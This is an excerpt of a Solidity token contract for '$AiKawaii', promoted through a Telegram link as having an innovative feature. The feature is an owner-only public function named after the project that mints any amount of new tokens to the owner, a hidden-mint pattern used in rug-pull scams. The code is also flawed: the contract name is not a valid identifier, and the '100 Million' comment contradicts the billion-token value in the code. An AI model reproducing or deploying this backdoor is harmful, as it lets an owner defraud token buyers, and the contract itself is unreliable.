...
//
// $AiKawaii proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/AIKawaiibsc
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _AiKawaii(uint256 amount) public onlyOwner {
 _AiKawaii(msg.sender, amount);
    }
    ...
    function _AiKawaii(address account, uint256 amount) internal virtual {
...
contract $AiKawaii is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Ai Kawaii", "AK") {
     _AiKawaii(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}